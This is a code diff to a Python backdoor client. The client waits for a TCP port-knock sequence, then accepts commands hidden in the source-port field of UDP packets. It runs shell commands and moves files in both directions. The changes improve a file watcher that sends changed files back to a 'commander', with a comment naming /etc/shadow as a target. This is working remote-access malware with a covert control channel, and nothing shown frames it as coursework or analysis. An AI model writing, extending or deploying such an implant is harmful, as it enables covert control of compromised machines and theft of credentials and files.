@@ -20,23 +20,36 @@ from file_watcher import FileWatcher
 
 # Configuration
 KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
-KNOCK_TIMEOUT = 10  # Seconds to complete knock sequence
-COMMAND_PORT = 8888  # UDP port for covert channel
-TMP_DIR = "client_files/"  # Directory for files transferred from commander
+KNOCK_TIMEOUT  = 10                   # Seconds to complete knock sequence
+COMMAND_PORT   = 8888                 # UDP port for covert channel
+TMP_DIR        = "client_files/"     # Directory for files transferred from commander
 
 
 class CommandType(IntEnum):
     """Commands encoded in UDP src-port field"""
-    DISCONNECT = 0x1234
-    UNINSTALL = 0x2345
-    TRANSFER_TO_CLIENT = 0x3456
+    DISCONNECT           = 0x1234
+    UNINSTALL            = 0x2345
+    TRANSFER_TO_CLIENT   = 0x3456
     TRANSFER_FROM_CLIENT = 0x4567
-    RUN_COMMAND = 0x5678
-    FILE_WATCH = 0x6789
-    STOP_WATCH = 0x8901
-    FILE_DELETE = 0x7890
-    ACK = 0x9ABC
-    ERROR = 0xABCD
+    RUN_COMMAND          = 0x5678
+    FILE_WATCH           = 0x6789  # start watching a directory; push changes to commander
+    FILE_DELETE          = 0x7890  # notify commander to delete a file from received_files/
+    STOP_WATCH           = 0x8901  # commander � client: stop the file watcher
+    ACK                  = 0x9ABC
+    ERROR                = 0xABCD
+
+
+# Command codes the client should accept as inbound instructions.
+# Used to filter out the client's own outbound ACK/ERROR/FILE_WATCH/FILE_DELETE packets.
+COMMAND_CODES = frozenset([
+    0x1234,  # DISCONNECT
+    0x2345,  # UNINSTALL
+    0x3456,  # TRANSFER_TO_CLIENT
+    0x4567,  # TRANSFER_FROM_CLIENT
+    0x5678,  # RUN_COMMAND
+    0x6789,  # FILE_WATCH  (commander requesting a watch)
+    0x8901,  # STOP_WATCH
+])
 
 
 class Client:
@@ -47,17 +60,17 @@ class Client:
     """
 
     def __init__(self):
-        self.knock_ports = KNOCK_SEQUENCE
-        self.command_port = COMMAND_PORT
-        self.knock_sequence = KNOCK_SEQUENCE
-        self.knock_timeout = KNOCK_TIMEOUT
-        self.knock_attempts = {}
-        self.authorized_ips = set()
-        self.lock = threading.Lock()
-        self.running = True
-        self.protocol = RawSocketProtocol()
-        self._watcher_thread = None  # active watcher thread
-        self._watcher_stop = threading.Event()  # set to stop the watcher
+        self.knock_ports     = KNOCK_SEQUENCE
+        self.command_port    = COMMAND_PORT
+        self.knock_sequence  = KNOCK_SEQUENCE
+        self.knock_timeout   = KNOCK_TIMEOUT
+        self.knock_attempts  = {}
+        self.authorized_ips  = set()
+        self.lock            = threading.Lock()
+        self.running         = True
+        self.protocol        = RawSocketProtocol()
+        self._watcher_thread  = None   # active FileWatcher thread
+        self._watcher_stop    = threading.Event()  # set this to stop the watcher
 
     # ------------------------------------------------------------------ #
     #  Port-knock helpers                                                  #
@@ -143,10 +156,10 @@ class Client:
     def _reset_transfer_state(self):
         """Return a clean slate for a new inbound transfer."""
         return {
-            'chunks': {},
+            'chunks':        {},
             'expected_total': None,
             'current_command': None,
-            'current_src_ip': None,
+            'current_src_ip':  None,
         }
 
     def listen_for_covert_commands(self):
@@ -173,27 +186,29 @@ class Client:
 
                     src_ip = addr[0]
 
-                    if not self.is_authorized(src_ip):
-                        print(f"[!] Unauthorized covert packet from {src_ip} — ignoring")
+                    # Ignore our own outbound response packets
+                    if parsed["command"] not in COMMAND_CODES:
                         continue
 
-                    seq = parsed["seq"]
-                    data = parsed["data"]
-                    total = parsed["total"]
+                    if not self.is_authorized(src_ip):
+                        print(f"[!] Unauthorized covert packet from {src_ip}  ignoring")
+                        continue
+
+                    seq          = parsed["seq"]
+                    data         = parsed["data"]
+                    total        = parsed["total"]
                     command_code = parsed["command"]
 
-                    # ── Reset if a new sender interrupts an in-progress transfer ──
                     if state['current_src_ip'] is not None and src_ip != state['current_src_ip']:
                         print(f"[!] Source IP changed mid-transfer "
-                              f"({state['current_src_ip']} → {src_ip}) — resetting state")
+                              f"({state['current_src_ip']} {src_ip}) resetting state")
                         state = self._reset_transfer_state()
 
-                    # ── Initialise state on first packet of a new command ─────────
                     if state['expected_total'] is None:
-                        state['expected_total'] = total
-                        state['current_command'] = command_code
-                        state['current_src_ip'] = src_ip
-                        state['chunks'] = {}
+                        state['expected_total']   = total
+                        state['current_command']  = command_code
+                        state['current_src_ip']   = src_ip
+                        state['chunks']           = {}
                         print(f"\n[+] Receiving covert command from {src_ip}")
                         print(f"    Expected packets: {total}")
 
@@ -207,7 +222,6 @@ class Client:
                     if received % 50 == 0 and received > 0:
                         print(f"    Received {received}/{state['expected_total']}")
 
-                    # ── All chunks received? ──────────────────────────────────────
                     if state['expected_total'] and received >= state['expected_total']:
 
                         # Check for sequence gaps before reassembling
@@ -215,7 +229,7 @@ class Client:
                         received_seqs = set(state['chunks'].keys())
                         if expected_seqs != received_seqs:
                             missing = expected_seqs - received_seqs
-                            print(f"[!] Missing sequences {missing} — dropping command")
+                            print(f"[!] Missing sequences {missing}  dropping command")
                             state = self._reset_transfer_state()
                             continue
 
@@ -296,8 +310,8 @@ class Client:
             print("[*] Processing TRANSFER_TO_CLIENT")
             try:
                 filename_length = struct.unpack('!H', payload[:2])[0]
-                filename = payload[2:2 + filename_length].decode('utf-8')
-                filedata = payload[2 + filename_length:]
+                filename        = payload[2:2 + filename_length].decode('utf-8')
+                filedata        = payload[2 + filename_length:]
 
                 print(f"    Receiving file: {filename} ({len(filedata)} bytes)")
 
@@ -310,7 +324,7 @@ class Client:
                 print(f"    Error saving file: {e}")
 
         elif command_type == CommandType.TRANSFER_FROM_CLIENT:
-            filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
+            filepath = payload.decode('utf-8', errors='ignore').strip()
             print(f"[*] Processing TRANSFER_FROM_CLIENT: {filepath}")
             try:
                 with open(filepath, 'rb') as f:
@@ -322,7 +336,7 @@ class Client:
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
         elif command_type == CommandType.RUN_COMMAND:
-            cmd = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
+            cmd = payload.decode('utf-8', errors='ignore').strip()
             print(f"[*] Processing RUN_COMMAND: {cmd}")
             try:
                 result = subprocess.run(
@@ -342,52 +356,99 @@ class Client:
 
         elif command_type == CommandType.FILE_WATCH:
             filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
+            filepath = os.path.abspath(os.path.expanduser(filepath))
             print(f"[*] Processing FILE_WATCH: {filepath}")
-
             try:
                 self._stop_file_watcher()
-                watcher = FileWatcher(path=filepath, recursive=True)
+
+                if not os.path.exists(filepath):
+                    raise ValueError(f"Path does not exist: {filepath}")
+
+                # Determine if watching a single file or a directory
+                if os.path.isfile(filepath):
+                    target_file = os.path.basename(filepath)
+                    watch_path  = os.path.dirname(filepath)
+                    recursive   = False
+                else:
+                    target_file = None
+                    watch_path  = filepath
+                    recursive   = True
+
+                print(f"[DEBUG] target_file={target_file!r} watch_path={watch_path!r} recursive={recursive}")
+
+                ignore_exts = {'.swp', '.swx', '.tmp', '~'}
+                event_mask  = FileWatcher.DEFAULT_MASK
 
                 def run_watcher():
                     import inotify.adapters
                     try:
-                        i = inotify.adapters.InotifyTree(watcher.path, mask=watcher.event_mask)
+                        if recursive:
+                            i = inotify.adapters.InotifyTree(watch_path, mask=event_mask)
+                        else:
+                            i = inotify.adapters.Inotify()
+                            i.add_watch(watch_path, mask=event_mask)
+
                         for event in i.event_gen(yield_nones=True):
                             if self._watcher_stop.is_set():
                                 print("[*] File watcher stopped.")
                                 break
                             if event is None:
                                 continue
-                            _, type_names, watch_path, filename = event
-                            # Handle the event ourselves instead of calling watcher._handle()
+                            _, type_names, evt_path, filename = event
+
+                            # Sanitise filename
+                            if filename:
+                                filename = filename.strip().replace('\x00', '')
                             if not filename:
                                 continue
-                            _, ext = os.path.splitext(filename)
-                            if ext in watcher.ignore_exts or filename.startswith('.') or filename.endswith('~'):
+
+                            # Filter to target file if watching a single file
+                            if target_file and filename != target_file:
                                 continue
-                            full_path = os.path.join(watch_path, filename)
+
+                            # Skip swap/temp/hidden files and tilde backups
+                            _, ext = os.path.splitext(filename)
+                            if ext in ignore_exts or filename.startswith('.') or filename.endswith('~'):
+                                continue
+
+                            full_path = os.path.join(evt_path, filename)
+
                             for event_name in type_names:
                                 if event_name in ('IN_CLOSE_WRITE', 'IN_MOVED_TO'):
+                                    # Double-check target_file match inside event loop
+                                    if target_file and filename != target_file:
+                                        continue
+                                    # Use canonical path for atomic-rename workflows (e.g. /etc/shadow)
+                                    src = os.path.join(watch_path, target_file) if target_file else full_path
                                     try:
-                                        with open(full_path, 'rb') as f:
+                                        with open(src, 'rb') as f:
                                             filedata = f.read()
-
-                                        filename_bytes = filename.encode('utf-8')
-                                        pkt_payload = struct.pack('!H', len(filename_bytes)) + filename_bytes + filedata
+                                        send_name  = target_file or filename
+                                        name_bytes = send_name.encode('utf-8')
+                                        pkt_payload = struct.pack('!H', len(name_bytes)) + name_bytes + filedata
                                         self.send_response(src_ip, CommandType.FILE_WATCH, pkt_payload)
-
-                                        print(f"[*] Watcher: sent '{filename}' ({len(filedata)} bytes)")
-
+                                        print(f"[*] Watcher: sent '{send_name}' ({len(filedata)} bytes)")
                                     except Exception as e:
                                         print(f"[!] Watcher: could not send '{filename}': {e}")
 
-                                elif event_name in 'IN_DELETE':
-                                    print(f"filename = {filename}")
-                                    self.send_response(src_ip, CommandType.FILE_DELETE, filename.encode('utf-8'))
-                                    print(f"[*] Watcher: notified deletion of '{filename}'")
+                                elif event_name == 'IN_DELETE':
+                                    # Double-check target_file match inside event loop
+                                    if target_file and filename != target_file:
+                                        continue
+                                    send_name = target_file or filename
+                                    self.send_response(src_ip, CommandType.FILE_DELETE,
+                                                       send_name.encode('utf-8'))
+                                    print(f"[*] Watcher: notified deletion of '{send_name}'")
+
+                                elif event_name in ('IN_DELETE_SELF', 'IN_MOVE_SELF'):
+                                    print(f"[*] Watcher: watched path was deleted or moved, stopping.")
+                                    self._watcher_stop.set()
+                                    break
 
                     except Exception as e:
-                        print(f"[!] Watcher thread error: {e}")
+                        import traceback
+                        traceback.print_exc()
+                        print(f"[!] Watcher thread error: {e!r}")
 
                 self._watcher_stop.clear()
                 self._watcher_thread = threading.Thread(target=run_watcher, daemon=True)
@@ -404,12 +465,17 @@ class Client:
             print("    File watcher stopped.")
 
     def _stop_file_watcher(self):
-        """Stop the active watcher thread if one is running."""
+        """Stop the active file watcher thread if running."""
         if self._watcher_thread and self._watcher_thread.is_alive():
+            print("[*] Stopping existing file watcher...")
             self._watcher_stop.set()
             self._watcher_thread.join(timeout=3)
-        self._watcher_thread = None
+            self._watcher_thread = None
         self._watcher_stop.clear()
+
+    # ------------------------------------------------------------------ #
+    #  Response sender                                                     #
+    # ------------------------------------------------------------------ #
 
     def send_response(self, dst_ip, command_type, payload):
         """Send a response back to the commander via the covert channel."""
